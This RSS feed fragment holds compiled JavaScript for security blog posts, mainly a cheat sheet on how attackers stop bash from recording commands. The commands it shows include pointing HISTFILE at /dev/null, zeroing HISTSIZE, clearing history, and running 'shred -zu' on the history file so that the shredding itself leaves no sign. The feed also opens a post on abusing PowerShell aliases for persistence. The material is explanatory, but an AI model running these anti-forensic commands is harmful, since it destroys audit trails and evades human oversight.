+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;am0nsec&quot;), &quot; for the amazing post\non CLR hooking and for his awesome suggestions on this post.&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;li&quot;
+  }, {
+    &quot;href&quot;: &quot;https://twitter.com/subTee&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;subTee&quot;), &quot; for motivating me to work harder\nand for his amazing research on the topic as well.&quot;)), mdx(&quot;h2&quot;, {
+    &quot;id&quot;: &quot;references&quot;
+  }, &quot;References&quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;li&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;li&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/dotnet/framework/deployment/how-the-runtime-locates-assemblies&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;https://docs.microsoft.com/en-us/dotnet/framework/deployment/how-the-runtime-locates-assemblies&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;li&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/runtime-element&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/runtime-element&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;li&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/supportedruntime-element&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/supportedruntime-element&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;li&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/dotnet/api/system.appdomain&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;https://docs.microsoft.com/en-us/dotnet/api/system.appdomain&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;li&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/15hyw9x3(v=vs.100)&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/15hyw9x3(v=vs.100)&quot;))));
+}
+;
+MDXContent.isMDXComponent = true;</content:encoded></item><item><title><![CDATA[Hiding Your Tracks Bash History]]></title><description><![CDATA[Tricks to hide bash history.]]></description><link>https://secbytes.net/Hiding-Your-Tracks-Bash-History</link><guid isPermaLink="false">https://secbytes.net/Hiding-Your-Tracks-Bash-History</guid><dc:creator><![CDATA[Bad3r]]></dc:creator><pubDate>Mon, 20 Jan 2020 00:00:00 GMT</pubDate><content:encoded>function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i &lt; arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }
+
+function _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i &lt; sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) &gt;= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }
+
+function _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i &lt; sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) &gt;= 0) continue; target[key] = source[key]; } return target; }
+
+/* @jsx mdx */
+var _frontmatter = {
+  &quot;title&quot;: &quot;Hiding Your Tracks Bash History&quot;,
+  &quot;author&quot;: &quot;Bad3r&quot;,
+  &quot;date&quot;: &quot;2020-01-20T00:00:00.000Z&quot;,
+  &quot;hero&quot;: &quot;./images/Hiding-Your-Tracks-Bash-History.jpg&quot;,
+  &quot;excerpt&quot;: &quot;Tricks to hide bash history.&quot;
+};
+
+var makeShortcode = function makeShortcode(name) {
+  return function MDXDefaultShortcode(props) {
+    console.warn(&quot;Component &quot; + name + &quot; was not imported, exported, or provided by MDXProvider as global scope&quot;);
+    return mdx(&quot;div&quot;, props);
+  };
+};
+
+var layoutProps = {
+  _frontmatter: _frontmatter
+};
+var MDXLayout = &quot;wrapper&quot;;
+return function MDXContent(_ref) {
+  var components = _ref.components,
+      props = _objectWithoutProperties(_ref, [&quot;components&quot;]);
+
+  return mdx(MDXLayout, _extends({}, layoutProps, props, {
+    components: components,
+    mdxType: &quot;MDXLayout&quot;
+  }), mdx(&quot;p&quot;, null, &quot;Different techniques for preventing commands from being stored in &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;$HISTFILE&quot;)), mdx(&quot;h1&quot;, {
+    &quot;id&quot;: &quot;❯-bash-history&quot;
+  }, &quot;\u276F Bash history&quot;), mdx(&quot;p&quot;, null, &quot;Bash maintains the list of commands internally in memory while it\u2019s running. They are written into &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;$HISTFILE&quot;), &quot; (i.e, &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;~/.bash_history&quot;), &quot;)  when a user logs off. &quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F echo $HISTFILE           \n/home/bad3r/.bash_history\n&quot;)), mdx(&quot;p&quot;, null, &quot;This post is a cheat sheet for common methods attackers use to hide commands from being saved in the history file or in memory&quot;), mdx(&quot;h2&quot;, {
+    &quot;id&quot;: &quot;❯-leading-space&quot;
+  }, &quot;\u276F Leading Space&quot;), mdx(&quot;p&quot;, null, &quot;Might not be enabled by default in some distros &quot;), mdx(&quot;p&quot;, null, &quot;Starting each command with a leading space character&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F echo \&quot;hello\&quot;\nhello\n\u276F  echo \&quot;ritsec\&quot;\nritsec\n\u276F history \n    1  ls\n    2  echo \&quot;hello\&quot;\n    3  history \n&quot;)), mdx(&quot;p&quot;, null, &quot;Notice that the command &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;$echo \&quot;hello\&quot;&quot;), &quot; was saved  history unlike the commas with a leading space &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;$ echo \&quot;ritsec\&quot;&quot;), &quot;. This is possible because of &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;HISTCONTROL&quot;), &quot; environment variable &quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F head -2 /etc/os-release\n NAME=\&quot;Ubuntu\&quot; \n VERSION=\&quot;18.04.3 LTS (Bionic Beaver)\&quot; \n\u276F echo $HISTCONTROL\n ignoredups:ignorespace\n&quot;)), mdx(&quot;h2&quot;, {
+    &quot;id&quot;: &quot;❯-histfile&quot;
+  }, &quot;\u276F &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;h2&quot;
+  }, &quot;HISTFILE&quot;)), mdx(&quot;p&quot;, null, &quot;The &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;HISTFILE&quot;), &quot; environment variable specifies bash history file&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F man bash\nHISTFILE\n  The  name  of the file in which command history is saved (see HISTORY be\u2010\n  low).  The default value is ~/.bash_history.  If unset, the command  his\u2010\n  tory is not saved when a shell exits.\n  the  value of HISTIGNORE.  The pattern matching honors the setting of the\n  extglob shell option.\n&quot;)), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F echo $HISTFILE\n/home/bad3r/.bash_history\n&quot;)), mdx(&quot;p&quot;, null, &quot;To avoid recording commands to the file in &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;$HISTFILE&quot;), &quot; set &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;HISTFILE&quot;), &quot; value to &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;/dev/null&quot;), &quot; &quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F HISTFILE=/dev/null\nOR\n\u276F export HISTFILE=/dev/null\n&quot;)), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;❯-using-unset&quot;
+  }, &quot;\u276F Using unset&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;man bash\nunset\n  Remove variable or function names\n&quot;)), mdx(&quot;p&quot;, null, &quot;We can use &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;unset&quot;), &quot; to remove the variable &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;HISTFILE&quot;), &quot; for the current session &quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F echo $HISTFILE\n/root/.bash_history\n\u276F unset HISTFILE\n\u276F echo $HISTFILE\n\n\u276F\n&quot;)), mdx(&quot;p&quot;, null, &quot;Note that it will only effect the current session. If you start another session the variable &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;HISTFILE&quot;), &quot; will still be set unlike changing &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;$HISTILE&quot;), &quot; value to &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;/dev/null&quot;)), mdx(&quot;h2&quot;, {
+    &quot;id&quot;: &quot;❯-histsize--histfilesize&quot;
+  }, &quot;\u276F &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;h2&quot;
+  }, &quot;HISTSIZE&quot;), &quot; &amp; &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;h2&quot;
+  }, &quot;HISTFILESIZE&quot;)), mdx(&quot;p&quot;, null, &quot;Notice the distinction between &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;file&quot;), &quot;: on disk - and &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;list&quot;), &quot;: in memory.&quot;), mdx(&quot;p&quot;, null, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;HISTSIZE&quot;), &quot; is the number of lines or commands that are stored in memory in a history list while your bash session is ongoing.&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F man bash\n\nHISTSIZE\n  The number of commands to remember in the command  history  (see  HISTORY\n  below).   If  the value is 0, commands are not saved in the history list.\n  Numeric values less than zero result in every command being saved on  the\n  history  list  (there  is no limit).  The shell sets the default value to\n  500 after reading any startup files.\n&quot;)), mdx(&quot;p&quot;, null, &quot;In order to remove all commands from to the history list in memory change the size to 0&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F echo $HISTSIZE\n1000\n\u276F HISTSIZE=0  # OR export HISTSIZE=0\n\u276F echo $HISTSIZE\n0\n&quot;)), mdx(&quot;p&quot;, null, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;HISTFILESIZE&quot;), &quot; is the number of lines or commands that &quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;are allowed in the history file at startup time of a session, and&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;are stored in the history file at the end of your bash session for use in future sessions.&quot;)), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F man bash\n\nHISTFILESIZE\n  The  maximum  number  of  lines contained in the history file.  When this\n  variable is assigned a value, the history file is  truncated,  if  neces\u2010\n  sary, to contain no more than that number of lines by removing the oldest\n  entries.  The history file is also truncated to this size  after  writing\n  it  when a shell exits.  If the value is 0, the history file is truncated\n  to zero size.  Non-numeric values and numeric values less than  zero  in\u2010\n  hibit truncation.  The shell sets the default value to the value of HIST\u2010\n  SIZE after reading any startup files.\n&quot;)), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F echo $HISTFILESIZE\n2000\n\u276F HISTFILESIZE=0  # OR export HISTFILESIZE=0\n&quot;)), mdx(&quot;h2&quot;, {
+    &quot;id&quot;: &quot;❯-the-set--shopt-builtin&quot;
+  }, &quot;\u276F The Set &amp; Shopt Builtin&quot;), mdx(&quot;p&quot;, null, &quot;The &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;set&quot;), &quot; builtin allows you to change the values of shell options and set the positional parameters, or to display the names and values of shell variables.\nUsing &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;set&quot;), &quot; we can avoid recording new commands to the history list in memory. And,  because it\u2019s not being saved in memory, it can not be recorded to file&quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;-o&quot;), &quot; option-name:    Set the option corresponding to option-name &quot;)), mdx(&quot;p&quot;, null, &quot;The option name here is &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;history&quot;), &quot; and its enabled by default. Using \u2018+\u2019 rather than \u2018-\u2019 causes these options to be turned off&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F set +o history\n&quot;)), mdx(&quot;p&quot;, null, &quot;Using \u2018-\u2019 we can enable it again;&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F set -o history\n&quot;)), mdx(&quot;p&quot;, null, &quot;Alternatively the &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;shopt&quot;), &quot; builtin command can be used\nshopt builtin command allows you to change additional shell optional behavior.&quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;-u&quot;), &quot;    Disable (unset) each optname.\n&quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot; &quot;), &quot;-o`    Restricts the values of optname to be those defined for the -o option to the set builtin&quot;)), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F shopt -ou history\n&quot;)), mdx(&quot;p&quot;, null, &quot;Re-enable it using the &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;-s&quot;), &quot; flag; &quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;-s&quot;), &quot;    Enable (set) each optname.&quot;)), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F shopt -os history\n&quot;)), mdx(&quot;h2&quot;, {
+    &quot;id&quot;: &quot;❯-clearing-the-history&quot;
+  }, &quot;\u276F Clearing the History&quot;), mdx(&quot;p&quot;, null, &quot;Rather than disabling command history, we can clear the history on the current bash shell by simply using the &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;history&quot;), &quot; command with the &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;-c&quot;), &quot; (clear) flag&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F history -c\n&quot;)), mdx(&quot;p&quot;, null, &quot;Then, to make certain the changes are written to disk, we need to tell the history command to write to disk with the &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;-w&quot;), &quot; flag&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F history -w\n&quot;)), mdx(&quot;p&quot;, null, &quot;This only clears the history of the current shell. Commands run in other shells will remain on disk.&quot;), mdx(&quot;h2&quot;, {
+    &quot;id&quot;: &quot;❯-shredding-the-history&quot;
+  }, &quot;\u276F Shredding the History&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F man shred\n  shred - overwrite a file to hide its contents, and optionally delete it\n&quot;)), mdx(&quot;p&quot;, null, &quot;The &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;shred&quot;), &quot; command shreds the target file making it unreadable&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F cat $HISTFILE\nls\nhistory -w\n\u276F shred $HISTFILE\n\u276F cat $HISTFILE\n ,I\xE7!h\xF92g2V?\u01A5f[\xC6{L\xB4w\u0658\xCC\u02FFvC\xD3/Zs\nP\xECP\xF5\xE4{K{\xEB\xFAJ :i6\xAD\xDA\xFBR\u0708?\xC4\xF1W?\xE4\xC6n6\xBB\xAC\xCBo\xFBD;NG\xD6\xCB\xD3\xE2\xAFTR\x7F\xFA&amp;\xCD__t\xC7\xD9\n?\xCFG5\xC3\xF6-\xF2y\xDE\xC8\n           O\xCB\xE3\n...\n&quot;)), mdx(&quot;p&quot;, null, &quot;After using the &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;shred&quot;), &quot; command the history file contains bunch of binary data that is nonsense.&quot;), mdx(&quot;p&quot;, null, &quot;The fact that the file is shredded may in itself be considered evidence of malicious activity. We can eliminate even that by combining the &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;shred&quot;), &quot; command with the &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;-zu&quot;), &quot; flags&quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;-u&quot;), &quot; deallocate and remove file after overwriting&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;-z&quot;), &quot; a final overwrite with zeros to hide shredding&quot;)), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F cat $HISTFILE\nls\nhistory -w\u276F docker exec -ti 6e0aec73e61c bash\n\n\u276F shred -zu $HISTFILE\n\u276F cat $HISTFILE\ncat: /root/.bash_history: No such file or directory\n&quot;)), mdx(&quot;h2&quot;, {
+    &quot;id&quot;: &quot;❯-killing-bash-process&quot;
+  }, &quot;\u276F Killing Bash Process&quot;), mdx(&quot;p&quot;, null, &quot;Using the &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;kill&quot;), &quot; command we can exit the session without saving commands in memory to disk using;&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F kill -9 $$\n&quot;)), mdx(&quot;p&quot;, null, &quot;thanks to &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://twitter.com/ReigningShells&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;@ReigningShells&quot;)), mdx(&quot;h2&quot;, {
+    &quot;id&quot;: &quot;❯-using-more&quot;
+  }, &quot;\u276F Using More&quot;), mdx(&quot;p&quot;, null, &quot;We can hide a command from being saved in memory using &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;more&quot;), &quot; ability to excute commands by prepending them with &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;!&quot;), &quot; &quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;!&lt;cmd&gt;&quot;), &quot; or &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;:!&lt;cmd&gt;&quot;), &quot; Execute &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;&lt;cmd&gt;&quot;), &quot; in a subshell&quot;)), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;\u276F ps -aef | more                        \nUID          PID    PPID  C STIME TTY          TIME CMD\nroot           1       0  0 Jan20 ?        00:00:03 /sbin/init\nroot           2       0  0 Jan20 ?        00:00:00 [kthreadd]\nroot           3       2  0 Jan20 ?        00:00:00 [rcu_gp]\n...\n!echo \&quot;thanks @13_0_0_0_0\&quot;\nthanks @13_0_0_0_0\n------------------------\n&quot;)), mdx(&quot;p&quot;, null, &quot;At the more prompt type &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;!&quot;), &quot; or &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;:!&quot;), &quot; followed by your command.&quot;), mdx(&quot;p&quot;, null, &quot;This same technique can be used with other &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://gtfobins.github.io/&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;GTFOBIN&quot;), &quot; like &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;vim&quot;), &quot; &quot;));
+}
+;
+MDXContent.isMDXComponent = true;</content:encoded></item><item><title><![CDATA[Using and Abusing Aliases with PowerShell]]></title><description><![CDATA[Shimming Aliases with PowerShell]]></description><link>https://secbytes.net/Using-and-Abusing-Aliases-with-PowerShell</link><guid isPermaLink="false">https://secbytes.net/Using-and-Abusing-Aliases-with-PowerShell</guid><dc:creator><![CDATA[NotoriousRebel]]></dc:creator><pubDate>Sun, 24 Nov 2019 00:00:00 GMT</pubDate><content:encoded>function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i &lt; arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }
+
+function _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i &lt; sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) &gt;= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }
+
+function _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i &lt; sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) &gt;= 0) continue; target[key] = source[key]; } return target; }
+
+/* @jsx mdx */
+var _frontmatter = {
+  &quot;title&quot;: &quot;Using and Abusing Aliases with PowerShell&quot;,
+  &quot;author&quot;: &quot;NotoriousRebel&quot;,
+  &quot;date&quot;: &quot;2019-11-24T00:00:00.000Z&quot;,
+  &quot;hero&quot;: &quot;./images/Treasure.jpg&quot;,
+  &quot;excerpt&quot;: &quot;Shimming Aliases with PowerShell&quot;
+};
+
+var makeShortcode = function makeShortcode(name) {
+  return function MDXDefaultShortcode(props) {
+    console.warn(&quot;Component &quot; + name + &quot; was not imported, exported, or provided by MDXProvider as global scope&quot;);
+    return mdx(&quot;div&quot;, props);
+  };
+};
+
+var layoutProps = {
+  _frontmatter: _frontmatter
+};
+var MDXLayout = &quot;wrapper&quot;;
+return function MDXContent(_ref) {
+  var components = _ref.components,
+      props = _objectWithoutProperties(_ref, [&quot;components&quot;]);
+
+  return mdx(MDXLayout, _extends({}, layoutProps, props, {
+    components: components,
+    mdxType: &quot;MDXLayout&quot;
+  }), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;introduction&quot;
+  }, &quot;Introduction&quot;), mdx(&quot;p&quot;, null, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/LOLBAS-Project/LOLBAS&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;LOLBAS&quot;), &quot;\nIn preparation for another &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://lockdown.ubnetdef.org/&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;UB Lockdown&quot;), &quot;, I had a goal in mind,\nwork on a new tool for Windows Persistence. It\u2019s good to thoroughly understand\nother developers tools that have been made such as\n&quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/outflanknl/SharpHide/&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
